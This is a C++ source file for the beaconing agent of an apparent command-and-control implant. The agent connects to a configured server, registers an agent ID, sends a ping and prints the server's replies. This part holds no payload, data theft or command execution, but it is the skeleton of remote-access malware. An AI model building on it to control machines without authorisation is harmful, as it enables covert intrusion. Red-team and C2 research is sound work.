#include <string>
#include <sstream>
#include <fstream>
#include <unistd.h>
#include <thread>

#include <asio.hpp>
#include <asio/ts/internet.hpp>
#include <asio/ts/buffer.hpp>

#include "implant.h"

using json = nlohmann::json;

Implant::Implant(std::string server_host, std::string server_port, std::string agent_id, bool isRunning):
    host{ std::move(server_host) },
    port{ std::move(server_port) }, 
    id{ std::move(agent_id) },
    isRunning{ std::move(isRunning) }
{
}

void Implant::beacon() {
    if (isRunning) {
        asio::error_code ec;
        asio::ip::tcp::endpoint endpoint(asio::ip::make_address(host, ec), std::stoi(port));
        asio::ip::tcp::socket socket(context); 
        asio::streambuf buf;

        socket.async_connect(endpoint, [&](const asio::error_code& error) {
            if (!error) {
                std::cout << "Connected to the server!" << std::endl;
                
                // Listen for messages
                msg::receiveResponse(socket, buf); 

                // Send Register Info
                registerAgent(socket);

                // send heartbeat every x seconds/minutes
                heartbeat(socket);
                
            } else {
                // Check for specific errors
                if (error == asio::error::connection_refused) {
                    std::cout << "Connection refused. The server may not be running." << std::endl;
                } else {
                    std::cout << "Error connecting to the server: " << error.message() << std::endl;
                }
            }
        });

        context.run();
    }
}

void Implant::handleResponse(std::string& data) {
    std::cout << "DATA: " << data << std::endl;
}

void Implant::registerAgent(asio::ip::tcp::socket& socket) {
    RegisterAgent registerAgent(id);
    msg::Request registerResult = registerAgent.run();
    msg::sendRequest(socket, registerResult);
}

void Implant::heartbeat(asio::ip::tcp::socket& socket) {
    PingTask ping(id);
    msg::Request pingResult = ping.run();
    msg::sendRequest(socket, pingResult);
}

void Implant::setRunning(bool running) { isRunning = running; }
void Implant::setId(std::string& new_agent_id) { id = new_agent_id; }